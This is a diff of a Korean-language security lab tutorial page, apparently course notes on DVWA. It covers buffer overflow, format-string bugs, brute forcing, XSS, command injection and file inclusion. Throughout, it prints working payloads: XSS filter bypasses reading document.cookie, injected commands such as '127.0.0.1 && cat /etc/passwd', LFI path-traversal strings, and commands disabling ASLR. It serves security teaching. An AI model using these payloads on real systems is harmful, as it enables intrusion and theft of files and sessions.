+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 정상 입력
 ./bof-auth hello
 # → 인증 실패
 ./bof-auth secret123
@@ -329,7 +353,7 @@ sudo gcc -fno-stack-protector -o bof-auth bof_auth.c
 # 버퍼를 훨씬 초과하는 임의 데이터 입력
 ./bof-auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
 # → 인증 성공 (인증 우회 발생)
-</code></pre></div>
+</code></pre></div></div>
 
 <p>⚠️ 버퍼 오버플로우로 인해 auth_status  변수 값이 변조되어, secret123  없이도 인증이 성공하는 취약점이 발생한다. 이는 BOF를 통한 인증 우회 사례이다.</p>
 <h4 id="7-시스템-함수-명령어-변조">7. 시스템 함수 명령어 변조</h4>
@@ -338,7 +362,7 @@ sudo gcc -fno-stack-protector -o bof-auth bof_auth.c
 <p>strcpy  사용으로 입력 길이 검증 없음</p>
 <p>system(command)  함수로 명령어를 실행하여 결과 출력</p>
 <h5 id="7-2">7-2. 컴파일 및 실행</h5>
-<div class="codehilite"><pre><span></span><code># 컴파일
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 컴파일
 sudo gcc -fno-stack-protector -z execstack -no-pie -o bof_s
 ystem bof_system.c
 # 정상 입력 (16바이트 이하)
@@ -350,16 +374,16 @@ ystem bof_system.c
 실행
 ./bof_system AAAAAAAAAAAAAAAA ls
 # → ls 명령어가 실행됨
-</code></pre></div>
+</code></pre></div></div>
 
 <p>16바이트 이내 데이터는 사용자 입력으로, 16바이트를 초과하는 부분은 실행할 명령어로 인식된다. 버퍼를 훨씬 초과하는 입력을 주면 세그멘테이션 폴트가 발생하여 프로그램이 비정상 종료된다.</p>
 <h4 id="8-aslr-설정-확인-및-변경">8. ASLR 설정 확인 및 변경</h4>
 <h5 id="8-1-aslr">8-1. ASLR 현재 값 확인</h5>
-<div class="codehilite"><pre><span></span><code># sysctl 명령으로 확인
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># sysctl 명령으로 확인
 sysctl kernel.randomize_va_space
 # 또는 파일 경로에서 직접 확인
 cat /proc/sys/kernel/randomize_va_space
-</code></pre></div>
+</code></pre></div></div>
 
 <h5 id="8-2-aslr">8-2. ASLR 값 의미</h5>
 <div class="tablewrap"><table>
@@ -381,17 +405,17 @@ cat /proc/sys/kernel/randomize_va_space
 </tbody>
 </table></div>
 <h5 id="8-3">8-3. 일시적 변경 (재부팅 시 초기화)</h5>
-<div class="codehilite"><pre><span></span><code># ASLR 비활성화
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># ASLR 비활성화
 sudo sysctl -w kernel.randomize_va_space=0
 # ASLR 재활성화
 sudo sysctl -w kernel.randomize_va_space=1
-</code></pre></div>
+</code></pre></div></div>
 
 <h5 id="8-4">8-4. 영구 변경 (재부팅 후에도 유지)</h5>
-<div class="codehilite"><pre><span></span><code># 파일에 직접 0을 기록하면 재부팅 후에도 ASLR이 비활성화 상태로 유지
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 파일에 직접 0을 기록하면 재부팅 후에도 ASLR이 비활성화 상태로 유지
 된다
 echo 0 &gt; /proc/sys/kernel/randomize_va_space
-</code></pre></div>
+</code></pre></div></div>
 
 <p>⚠️ 우분투 리눅스를 재부팅하면 ASLR 값이 원래대로(1) 되돌아온다. 영구 변경 후에는 반드시 필요에 따라 다시 활성화해야 한다.</p>
 <hr />
@@ -400,13 +424,13 @@ echo 0 &gt; /proc/sys/kernel/randomize_va_space
 <h5 id="1-1">1-1. 정의</h5>
 <p>printf , printf , sprintf  등 포맷팅 함수를 잘못 사용하였을 때 발생하는 취약점이다. 출력 포맷이 지정되지 않은 상태에서 사용자 입력을 그대로 출력하도록 하면, 공격자가 임의의 포맷 문자열을 삽입하여 메모리 값을 읽거나 변조할 수 있다.</p>
 <h5 id="1-2-vs">1-2. 취약한 코드 vs 안전한 코드</h5>
-<div class="codehilite"><pre><span></span><code>// 취약한 코드 — 포맷 미지정
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>// 취약한 코드 — 포맷 미지정
 printf(user_input);
 // 안전한 코드 — 포맷 지정
 printf(&quot;%s&quot;, user_input);
 // 정수형 포맷 지정 예시
 printf(&quot;%s %d&quot;, user_input, age);
-</code></pre></div>
+</code></pre></div></div>
 
 <p>⚠️ 사용자로부터 입력을 받을 때는 각각의 포맷을 정확하게 지정해야 한다. 포맷이 지정되지 않으면 사용자가 원하는 포맷을 임의로 삽입할 수 있다.</p>
 <h4 id="2-포맷-스트링-주요-기호">2. 포맷 스트링 주요 기호</h4>
@@ -443,17 +467,17 @@ printf(&quot;%s %d&quot;, user_input, age);
 <p>strncpy  사용으로 BOF 취약점은 없음</p>
 <p>printf(buffer)  : 포맷 미지정으로 포맷 스트링 취약점 존재</p>
 <h5 id="3-2">3-2. 컴파일</h5>
-<div class="codehilite"><pre><span></span><code># PIE 비활성화 옵션으로 컴파일
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># PIE 비활성화 옵션으로 컴파일
 gcc -no-pie -o fs_leak fs_leak.c
-</code></pre></div>
+</code></pre></div></div>
 
 <p>컴파일 시 다음과 같은 경고 메시지가 출력된다.</p>
-<div class="codehilite"><pre><span></span><code>warning: format not a string literal and no format arguments [-Wformat-security]
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>warning: format not a string literal and no format arguments [-Wformat-security]
+</code></pre></div></div>
 
 <p>이 경고는 포맷이 지정되지 않은 위치(17번 라인)를 알려주는 것으로, 에러가 아닌 경고 (Warning)이다. 개발자는 이 경고를 통해 포맷을 지정해야 함을 인지할 수 있다.</p>
 <h5 id="3-3">3-3. 실행 결과</h5>
-<div class="codehilite"><pre><span></span><code># 정상 입력
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 정상 입력
 ./fs_leak hello
 # → hello 출력
 # 100바이트 초과 입력 시 → strncpy에 의해 검증되어 세그멘테이션 폴
@@ -464,7 +488,7 @@ gcc -no-pie -o fs_leak fs_leak.c
 # %s를 이용한 실제 데이터 값 읽기 (네 번째 위치)
 ./fs_leak &quot;%p%p%p%s%p%p...&quot;
 # → 네 번째 메모리 주소에 해당하는 실제 데이터 값(문자열) 출력
-</code></pre></div>
+</code></pre></div></div>
 
 <p>%p 를 여러 개 입력하면 스택에 있는 16진수 메모리 주소들이 순서대로 출력된다. %s 로 변경하면 해당 위치의 실제 데이터 값을 확인할 수 있다.</p>
 <h4 id="4-포맷-스트링-메모리-쓰기">4. 포맷 스트링 메모리 쓰기</h4>
@@ -475,19 +499,19 @@ gcc -no-pie -o fs_leak fs_leak.c
 <p>printf(buffer)  : 포맷 미지정으로 포맷 스트링 취약점 존재</p>
 <p>target_variable 이 0이 아니면 인증 성공, 0이면 변수 값 0 출력</p>
 <h5 id="4-2_1">4-2. 컴파일</h5>
-<div class="codehilite"><pre><span></span><code># BOF 취약점이 없으므로 메모리 보호 기법 우회 옵션 없이 컴파일
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># BOF 취약점이 없으므로 메모리 보호 기법 우회 옵션 없이 컴파일
 gcc -o fs_write fs_write.c
-</code></pre></div>
+</code></pre></div></div>
 
 <p>컴파일 시 포맷 관련 경고 메시지가 동일하게 출력된다.</p>
 <h5 id="4-3_1">4-3. 실행 결과</h5>
-<div class="codehilite"><pre><span></span><code># 정상 입력
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 정상 입력
 ./fs_write hello
 # → 변수 값이 0입니다 출력
 # %n 포맷 스트링 입력
 ./fs_write &quot;%n&quot;
 # → 프로그램이 정상 종료되지 않고 즉시 중단됨
-</code></pre></div>
+</code></pre></div></div>
 
 <p>%n  포맷 스트링을 입력하면 프로그램이 비정상적으로 동작한다. 이는 포맷 스트링 취약점으로 인해 발생하는 것이다. 변조하고자 하는 값을 %n  뒤에 삽입하여 메모리 값을 변조할 수 있으며, 정확한 위치 파악을 위해서는 gdb , gef  등의 툴이 필요하다.</p>
 <h4 id="5-정리">5. 정리</h4>
@@ -530,20 +554,20 @@ gcc -o fs_write fs_write.c
 <h4 id="3-hydra를-이용한-공격">3. Hydra를 이용한 공격</h4>
 <h5 id="3-1_1">3-1. 사전 준비</h5>
 <p>패스워드 목록 파일을 직접 작성하여 활용한다.</p>
-<div class="codehilite"><pre><span></span><code>vi password.txt
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>vi password.txt
 pass
 12345678
 qwer
 password
 qwerty
 spring
-</code></pre></div>
+</code></pre></div></div>
 
 <p>⚠️ 목록 파일에는 실제 패스워드를 포함시켜야 크래킹 테스트 시 정상적으로 찾아낼 수 있다.</p>
 <h5 id="3-2_1">3-2. 판단 기준</h5>
 <p>무작위 대입 시 어떤 값이 정답인지 판단하는 기준은 로그인 실패 시 출력되는 메시지의 존재 여부이다. 만약 대입한 값에서 해당 실패 메시지가 뜨지 않는다면 정상적인 계정 정보라 고 판단할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code>실패 메시지 예시: Username and/or password incorrect.
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>실패 메시지 예시: Username and/or password incorrect.
+</code></pre></div></div>
 
 <h5 id="3-3-hydra">3-3. Hydra 명령어 구성</h5>
 <p>명령어는 다음 순서로 구성한다.</p>
@@ -703,8 +727,8 @@ spring
 <p>⚠️ 단순 브루트 포싱으로는 이 토큰 정보를 확인하기 어려우므로 패스워드 크래킹이 불 가능하지만, CSRF 취약점과 같이 사용하면 추가적으로 토큰 정보를 알아내어 브루트 포 싱을 통해 패스워드를 크래킹할 수 있는 여지가 남아있다.</p>
 <h5 id="6-3-impossible-level">6-3. Impossible Level</h5>
 <p>소스를 확인하면 토큰 정보와 세션 정보를 비교하는 것, 각 입력값에 두 개의 함수로 처리하는 것 외에 추가적인 보완이 들어가 있다.</p>
-<div class="codehilite"><pre><span></span><code>로그인 실패 전체 횟수: 3
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>로그인 실패 전체 횟수: 3
+</code></pre></div></div>
 
 <p>세 번 로그인에 실패하면 락아웃(잠김) 처리가 되며, 일정 시간(15분)이 지나야 다시 시도할 수 있다. 이러한 방식 때문에 브루트 포싱이 상당히 힘들어진다.</p>
 <p>⚠️ Impossible 레벨에서도 단일 취약점만으로는 뚫을 수 없지만, 다른 취약점들과 함께 사용하면 뚫릴 수 있는 여지가 존재한다.</p>
@@ -758,14 +782,14 @@ spring
 <h5 id="3-1_2">3-1. 동작 방식 확인</h5>
 <p>URL의 파라미터에 임의의 문자열(예: ABC)을 넣어보면 "Hello" 뒤에 사용자의 입력값이 그대로 출력되는 것을 확인할 수 있다. URL에서 name이라고 하는 파라미터에 사용자가 입력한 값이 들어가고 있는 것을 확인할 수 있다.</p>
 <h5 id="3-2_2">3-2. 스크립트 태그 삽입</h5>
-<div class="codehilite"><pre><span></span><code>&lt;script&gt;alert(&#39;해킹&#39;)&lt;/script&gt;
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;script&gt;alert(&#39;해킹&#39;)&lt;/script&gt;
+</code></pre></div></div>
 
 <p>스크립트 태그는 &lt;script&gt; 로 시작해서 &lt;/script&gt; 로 닫아준다. alert는 경고창(팝업창)을 띄 우는 스크립트이며, 그 안에 들어갈 문자열은 따옴표 안에 지정할 수 있다.</p>
 <p>만약 이 스크립트가 먹힌다면 XSS 취약점이 있다는 것이 된다.</p>
 <h5 id="3-3_1">3-3. 쿠키 값 탈취 예시</h5>
-<div class="codehilite"><pre><span></span><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre></div></div>
 
 <p>document.cookie 를 사용하면 HTML 전체 문서에서 쿠키 값을 가져와 경고창으로 보여줄 수 있다. 일반 문자열을 출력할 때는 따옴표를 사용하지만, 명령어를 실행해서 가져오고 싶다면 문자열이 아니므로 따옴표 없이 지정한다.</p>
 <h5 id="3-4-1">3-4. 반사형(1회성) 검증</h5>
@@ -778,8 +802,8 @@ spring
 <p>Low Level과 동일한 스크립트 태그를 입력하면 &lt;script&gt; 와 &lt;/script&gt; 가 사라지고 "Hello" 뒤에 일반 문자열로만 출력된다. 소스를 확인하면 str_replace라는 문자열 대체 변환 함수를 통해 &lt;script&gt; , &lt;/script&gt;  태그를 공백으로 바꿔주도록 되어 있다.</p>
 <h5 id="4-2-1">4-2. 우회 방법 1 — 대소문자 혼용</h5>
 <p>HTTP 프로토콜 인식 방식과 마찬가지로, 웹브라우저는 스크립트 태그를 대소문자 구분 없이 인식한다. 소문자에 대해서만 공백 처리를 했기 때문에 대소문자를 섞으면 우회할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code>&lt;sCript&gt;alert(&#39;해킹&#39;)&lt;/scrIpt&gt;
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;sCript&gt;alert(&#39;해킹&#39;)&lt;/scrIpt&gt;
+</code></pre></div></div>
 
 <h5 id="4-3-2">4-3. 우회 방법 2 — 다른 태그를 이용한 회피</h5>
 <p>스크립트 태그가 아닌 다른 방식으로도 스크립트를 실행하는 우회법이 존재한다. (자세한 내용은 High Level에서 다룬다.)</p>
@@ -792,8 +816,8 @@ spring
 <p>⚠️ 슬래시가 들어오거나, "script"라는 문자열이 들어오면 다 공백 처리가 되기 때문에, 남아 있는 것은 거의 없어 일반적인 방법으로는 스크립트를 실행할 수 있는 문자열을 만들 어내기 어렵다.</p>
 <h5 id="5-3-img">5-3. 우회 방법 — img 태그를 이용한 이벤트 핸들러</h5>
 <p>스크립트 태그가 아니라 이미지(img) 태그를 이용해서 스크립트를 실행하는 방법이 존재한다. img src 는 이미지를 넣을 때 사용하는 HTML 태그이며, 경로 자리에 정상적인 이미지 경로가 아닌 임의의 값(예: x)을 넣으면 해당 경로에 이미지가 없으므로 오류(에러)가 발생한다.</p>
-<div class="codehilite"><pre><span></span><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(document.cookie)&quot;&gt;
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(document.cookie)&quot;&gt;
+</code></pre></div></div>
 
 <p>이미지를 찾지 못해 에러가 발생하면 onerror라는 속성을 통해 에러 발생 시 실행할 메시지 (스크립트)를 지정할 수 있다.</p>
 <p>⚠️ 실제 그림은 없으므로 이미지가 깨진 형태(액박)로 표시되지만, 스크립트는 정상적으로 실행되어 경고창과 쿠키 정보가 출력된다. "script"라는 문자열이 없기 때문에 공백 처리 대상에 걸리지 않아 정상적으로 실행되는 조건을 만들어낸 것이다.</p>
@@ -852,11 +876,11 @@ spring
 <p>코딩하는 사람이 이 함수들과 명령어를 함께 인자값으로 넣어서 웹브라우저에 결과가 나타 나도록 최종적으로 구현해 놓은 것이다.</p>
 <h5 id="1-4_1">1-4. 명령어 연결 기호</h5>
 <p>두 개 이상의 명령어를 연결할 때 사용하는 특수 기호는 다음과 같다.</p>
-<div class="codehilite"><pre><span></span><code>;  (세미콜론)
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>;  (세미콜론)
 &amp;&amp;
 ||
 |  (파이프라인)
-</code></pre></div>
+</code></pre></div></div>
 
 <p>⚠️ 입력하는 곳에 대한 검증 작업이 없게 되면 이러한 기호들을 통해 두 개 이상의 명령어를 추가로 실행시킬 수 있다.</p>
 <h4 id="2-low-level">2. Low Level</h4>
@@ -864,9 +888,9 @@ spring
 <p>Low Level 소스 코드를 보면, 사용자가 입력한 ip 값을 받아서 target이라는 변수에 집어넣 는다. 그 다음 ping에 target 변수를 붙여서 cmd라는 변수에 넣고, 마지막에 echo로 cmd 변수의 값을 모니터에 출력하도록 되어 있다. 검증하는 절차가 하나도 없으며, 단지 받은 값을 명령어로 실행하는 처리만 존재한다.</p>
 <h5 id="2-2">2-2. 공격 실행</h5>
 <p>앰퍼샌드(&amp;) 두 개를 이용해서 두 개 이상의 명령어를 연결할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code>127.0.0.1 &amp;&amp; id
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>127.0.0.1 &amp;&amp; id
 127.0.0.1 &amp;&amp; cat /etc/passwd
-</code></pre></div>
+</code></pre></div></div>
 
 <p>위와 같이 입력하면 ping 명령어 결과 밑에 id 명령어 실행 결과(UID, GID 등)가 함께 출력되는 것을 확인할 수 있다. 이는 이 웹페이지에 사용자가 입력하는 명령어에 대해서 검증하는 작업이 하나도 없다는 것을 의미한다.</p>
 <h4 id="3-medium-level">3. Medium Level</h4>
@@ -874,8 +898,8 @@ spring
 <p>Medium Level 소스를 확인하면 &amp;&amp; 와 ; 가 들어오면 공백으로 변환시키도록 되어 있다. 타겟에 들어가 있는 값을 str_replace라는 문자열 대체 함수를 통해 변환하는 방식이다.</p>
 <h5 id="3-2_3">3-2. 우회 방법</h5>
 <p>이 코드의 문제점은 모든 두 개 이상의 명령어를 연결할 수 있는 특수 기호를 다 공백 처리하 지는 못했다는 점이다. 파이프라인( | )을 사용하면 정상적으로 처리가 이루어지는 것을 확인할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code>127.0.0.1 | id
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>127.0.0.1 | id
+</code></pre></div></div>
 
 <p>⚠️ 다른 특수 문자들도 공백 처리가 되지 않았기 때문에 동일한 방식으로 문제가 발생할 수 있다.</p>
 <h4 id="4-high-level">4. High Level</h4>
@@ -883,8 +907,8 @@ spring
 <p>High Level 소스를 보면 &amp; , ; , | , || 까지 여러 특수 기호를 공백 처리하고 있는 것을 확인할 수 있다. 하지만 이 중 관리자가 실수한 부분이 있다. 자세히 보면 파이프라인( | ) 기호 뒤에 공백이 하나 있는 형태로 작성되어 있다.</p>
 <p>파이프라인 뒤에 공백이 하나 있는 경우에만 공백 처리하도록 되어 있다. 즉, 파이프라인을 넣고 띄어쓰기 없이 바로 명령어를 붙이면 해당 기호는 공백 처리되지 않는다.</p>
 <h5 id="4-2_3">4-2. 공략 방법</h5>
-<div class="codehilite"><pre><span></span><code>127.0.0.1 |id
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>127.0.0.1 |id
+</code></pre></div></div>
 
 <p>공백을 주지 않고 명령어를 바로 이어 붙이면 뒤에 나오는 명령어가 인식되어 실행되는 취약점을 만날 수 있다.</p>
 <p>⚠️ 코딩하다가 하나 띄어서 작성한 실수로, 생각 외로 이러한 부분들이 상당히 많다. 예전에는 개발자와 보안관리자가 완전히 분리되어 있었지만, 요즘은 개발자도 보안에 대한 기 본지식이 있어야 더 좋은 코딩을 할 수 있고, 보안관리자도 기본적인 문법을 보고 확인할 수 있는 역량이 있어야 더 좋다.</p>
@@ -903,9 +927,9 @@ spring
 <p>DVWA 머신은 슬리타즈(Slitaz) 리눅스로 구축되어 있다. 슬리타즈 리눅스는 아주 초경량의 리눅스 버전으로, 네트워크와 시스템적인 부분만 집약해서 경량화시켜 넣어놓은 리눅스이 다.</p>
 <p>⚠️ 현재 받은 dvwa-1.9.iso 파일은 최신 버전 대비 몇 가지 메뉴가 빠져 있다. 24버전 (우분투24)에서 DVWA를 설치하면 PHP 버전이 맞지 않기 때문에 파일 인클루전 실습이 이루어지지 않는다. 따라서 먼저 이전 버전으로 실습을 진행하고, 최신 버전은 별도로 우 분투에서 구축한 후 새로 나온 메뉴들을 확인한다.</p>
 <p>기본 계정 정보는 다음과 같다.</p>
-<div class="codehilite"><pre><span></span><code>계정: root
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>계정: root
 비밀번호: root
-</code></pre></div>
+</code></pre></div></div>
 
 <h4 id="2-virtualbox-머신-생성">2. VirtualBox 머신 생성</h4>
 <h5 id="2-1_2">2-1. 새 머신 설정값</h5>
@@ -977,12 +1001,12 @@ spring
 <p>브릿지로 설정했다고 하더라도 ifconfig (또는 ifconfig eth0 )으로 확인 시 ETH0에 IP가 올라오지 않는 경우가 발생할 수 있다.</p>
 <h5 id="3-2_4">3-2. 네트워크 설정 파일 수정</h5>
 <p>IP가 올라오지 않을 경우 네트워크 설정 파일을 수동으로 수정한다.</p>
-<div class="codehilite"><pre><span></span><code>파일 경로: /etc/network.conf
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>파일 경로: /etc/network.conf
+</code></pre></div></div>
 
 <p>이 파일의 두 번째 라인에는 다음 스크립트를 실행하라는 내용이 적혀 있다.</p>
-<div class="codehilite"><pre><span></span><code>경로: /etc/init.d/network.sh
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>경로: /etc/init.d/network.sh
+</code></pre></div></div>
 
 <h5 id="3-3-ip">3-3. 수동 IP 설정 절차</h5>
 <p>편집 모드로 들어가서 다음 항목을 수정한다.</p>
@@ -1030,9 +1054,9 @@ spring
 <p>⚠️ IP 주소는 윈도우에서 ipconfig 로 확인 후, 핑(ping) 테스트로 현재 사용하지 않는 IP를 선택하여 지정한다. 서브넷마스크, 게이트웨이, 네임서버는 ipconfig에서 확인된 값으로 동일하게 입력하면 된다. 네임서버는 입력하지 않아도 동작한다.</p>
 <h5 id="3-4_1">3-4. 설정 적용</h5>
 <p>네트워크 설정 파일을 저장하고 빠져나온 다음, 네트워크 스크립트 파일을 재시작한다.</p>
-<div class="codehilite"><pre><span></span><code>경로: /etc/init.d/network.sh
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>경로: /etc/init.d/network.sh
 명령: restart
-</code></pre></div>
+</code></pre></div></div>
 
 <p>해당 슬리타즈 리눅스 머신은 이 스크립트 파일에 의해 네트워크가 제어되는 방식이며, 재부팅이 아니라 스크립트 재시작으로 적용된다. 이후 ifconfig 로 IP가 정상적으로 올라와 있는지 확인한다.</p>
 <p>⚠️ 다음 날 머신을 끄고 다시 켜면 수동으로 설정했던 IP는 다시 사라진다. 따라서 매번 부팅 시 동일한 절차(네트워크 설정 파일 확인 및 스크립트 재시작)를 반복해야 한다.</p>
@@ -1041,13 +1065,13 @@ spring
 <p>칼리 리눅스를 부팅하여 로그인한 후 터미널을 열어 DVWA로 핑이 가는지 확인한다. 통신 확인이 완료되면 따로 DVWA 머신을 건드릴 일은 없다.</p>
 <h5 id="4-2_4">4-2. 웹 접속 및 로그인</h5>
 <p>공신 테스트가 완료되면 웹브라우저에서 HTTP로 DVWA의 IP 주소로 접속한다.</p>
-<div class="codehilite"><pre><span></span><code>접속 형식: http://[DVWA_IP]
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>접속 형식: http://[DVWA_IP]
+</code></pre></div></div>
 
 <p>접속하면 로그인 화면이 나타나며, 기본 계정 정보는 다음과 같다.</p>
-<div class="codehilite"><pre><span></span><code>ID: admin
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>ID: admin
 Password: password (모두 소문자)
-</code></pre></div>
+</code></pre></div></div>
 
 <p>로그인을 완료하면 강의 자료에서 확인했던 메인 화면이 나타난다.</p>
 <hr />
@@ -1082,19 +1106,19 @@ Password: password (모두 소문자)
 <h4 id="2-low-level--lfi">2. Low Level — LFI</h4>
 <h5 id="2-1_3">2-1. 입력값 검증 부재 확인</h5>
 <p>입력되는 파일에 대한 검증 작업이 없다면, 다른 파일을 입력해서 그 파일이 호출되는지 확인할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code>?page=/etc/passwd
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>?page=/etc/passwd
+</code></pre></div></div>
 
 <p>위와 같이 호출했을 때 LFI가 성립되어 실제 /etc/passwd 파일의 내용이 출력되는 것을 확인할 수 있다.</p>
 <h5 id="2-2_2">2-2. 경로 조작을 이용한 우회</h5>
-<div class="codehilite"><pre><span></span><code>?page=../../etc/passwd
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>?page=../../etc/passwd
+</code></pre></div></div>
 
 <p>점점슬래시( ../ )를 반복하여 상위 디렉토리로 이동한 후 파일을 조회하는 방식도 동일하게 동작한다.</p>
 <h5 id="2-3-file">2-3. file 프로토콜을 이용한 호출</h5>
 <p>프로토콜을 지정하는 방법으로 file 프로토콜을 활용할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code>?page=file:///etc/passwd
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>?page=file:///etc/passwd
+</code></pre></div></div>
 
 <p>이렇게 해도 동일하게 /etc/passwd 파일의 내용이 출력된다.</p>
 <p>⚠️ LFI와 패스 트래버설(Path Traversal, 경로 조작)은 비슷하지만 다르다. LFI는 호출 한 파일 내에 실행할 수 있는 코드값이 있어서 파일 인클루전이 되는 경우이고, 그냥 경로에 있는 내용을 그대로 출력만 하는 경우(코드 실행이 아닌 단순 출력)는 패스 트래버설 (경로 조작)이라고 한다.</p>
@@ -1131,22 +1155,22 @@ Password: password (모두 소문자)
 </table></div>
 <h5 id="3-2-lfi-rfi">3-2. LFI 우회 가능, RFI 차단 확인</h5>
 <p>점점슬래시를 엮지 않은 단순 LFI는 그대로 잘 동작한다.</p>
-<div class="codehilite"><pre><span></span><code>?page=/etc/passwd
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>?page=/etc/passwd
+</code></pre></div></div>
 
 <p>하지만 RFI 방식은 http:// 가 공백 처리되어 버려서 실제로는 페이지에 192.X와 같은 형태로 잘못 입력되어 경로가 맞지 않으므로 파일이 실행되지 않는다.</p>
 <h5 id="3-3_2">3-3. 개발자가 간과한 핵심 부분</h5>
